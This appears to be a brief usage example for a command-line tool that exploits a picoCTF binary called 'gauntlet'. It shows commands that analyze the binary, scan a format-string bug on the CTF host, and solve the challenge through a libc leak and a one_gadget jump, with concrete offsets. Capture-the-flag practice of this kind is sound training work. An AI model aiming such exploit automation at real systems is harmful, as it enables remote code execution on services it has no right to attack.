# Example

## Analyze
```bash
python3 main.py analyze ./gauntlet
python3 main.py suggest ./gauntlet
python3 main.py strategy ./gauntlet
```

## fmt scan
```bash
python3 main.py fmt-scan ./gauntlet --host wily-courier.picoctf.net --port 62738 --count 30
```

## one_gadget solve
```bash
python3 main.py solve ./gauntlet --host wily-courier.picoctf.net --port 62738 --mode fmt-one-gadget --leak-slot 23 --libc ./libc-2.27.so --ret-delta 0xe7 --one-gadget 0x4f2c5 --offset 120
```
